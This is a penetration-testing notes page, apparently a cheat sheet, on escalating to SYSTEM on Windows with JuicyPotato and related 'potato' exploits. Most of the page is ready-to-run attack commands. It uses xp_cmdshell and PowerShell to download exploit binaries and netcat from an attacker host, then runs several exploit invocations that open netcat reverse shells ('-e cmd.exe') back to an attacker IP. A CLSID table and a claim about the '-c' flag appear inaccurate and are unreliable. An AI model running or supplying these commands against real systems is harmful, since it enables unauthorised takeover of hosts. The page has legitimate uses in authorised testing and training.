---
title: JuicyPotato
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - privilege
---
# 🥔 JuicyPotato

Escalating privileges to `SYSTEM` level when the command `whoami /priv` confirms that [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) is listed for our user.

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

Download from: [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)


**1.** Upload the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. 

```
# Serve the content from your kali attacking machine
python3 -m http.server 80

# If we have for example a myssql connection 
xp_cmdshell "powershell -c cd C:\Tools; wget http://IPfromOurKali/JuicyPotato.exe -outfile JuicyPotato.exe"
xp_cmdshell "powershell -c cd C:\Tools; wget http://IPfromOurKali/nc64.exe -outfile nc64.exe"
```


**2.**  Set a listener in your attacking machine:

```
nc -lnvp 1234
```

**3.** Run JuicyPotato:

```
# From the myssql connection
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe $IPattackingMachine 1234 -e cmd.exe" -t *

# From a terminal run by an user with SeImpersonatePrivilege:
.\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe  $IPattackingMachine 1234 -e cmd.exe" -t *
```

## Troubleshooting CLSID

- In Windows, a **CLSID** (Class ID) is a **unique identifier** (GUID format) for a **COM object**.
- JuicyPotato (and similar exploits) work by abusing **specific COM services** that:
    
    - Run as SYSTEM
    - Allow you (the user) to trigger them
    - Are vulnerable to impersonation (they delegate their privileges poorly)
        
- If the COM service doesn't behave correctly (wrong CLSID), you get errors like `recv failed with error: 10038`.


→ **So the choice of CLSID is critical**: **Some CLSIDs will work; others will not depending on your OS and what services are running.**


### Which CLSIDs should you use on Windows Server 2016?

Here are some CLSIDs often successful on Windows Server 2016:

| CLSID                                    | Description          | Notes                        |
| ---------------------------------------- | -------------------- | ---------------------------- |
| `{3E5FC7F9-9A51-4367-9063-A120244FBEC7}` | `IObjectActivator`   | Very commonly works          |
| `{4991d34b-80a1-4291-83b6-3328366b9097}` | `BITS`               | Might still work sometimes   |
| `{d63e0ce2-a0a2-11d0-9c02-00c04fc99c8e}` | `PSFactoryBuffer`    | Good choice                  |
| `{e60687f7-01a1-40aa-86ac-db1cbf673334}` | `ShellBrowserWindow` | Sometimes works              |
| `{d20caec4-5ca8-4905-ae3b-bf251ea09b53}` | `ShellWindows`       | Works but unstable sometimes |


```powershell
.\JuicyPotatoNG.exe -p cmd.exe -a "/c your_payload" -t * -l 9999 -c

# Example:
.\JuicyPotato.exe -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\Documents\nc64-32.exe 10.10.15.146 1234 -e cmd.exe" -t * -l 9999 -c


.\JuicyPotato.exe -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\Documents\nc64-32.exe 10.10.15.146 1234 -e cmd.exe" -c {3E5FC7F9-9A51-4367-9063-A120244FBEC7}

.\JuicyPotato.exe -p c:\windows\system32\cmd.exe -a "C:\Users\Public\Documents\nc64-32.exe 10.10.15.146 1234 -e cmd.exe" -t * -l 9999 -c {3E5FC7F9-9A51-4367-9063-A120244FBEC7}

.\MSFRottenPotato.exe -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\Documents\nc64-32.exe 10.10.15.146 1234 -e cmd.exe" -t * -l 9999 -c {d63e0ce2-a0a2-11d0-9c02-00c04fc99c8e}

.\JuicyPotatoNG.exe -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\Documents\nc64-32.exe 10.10.15.146 1234 -e cmd.exe" -t * -b

```

where `-c` = **scan all CLSIDs** and find a working one automatically.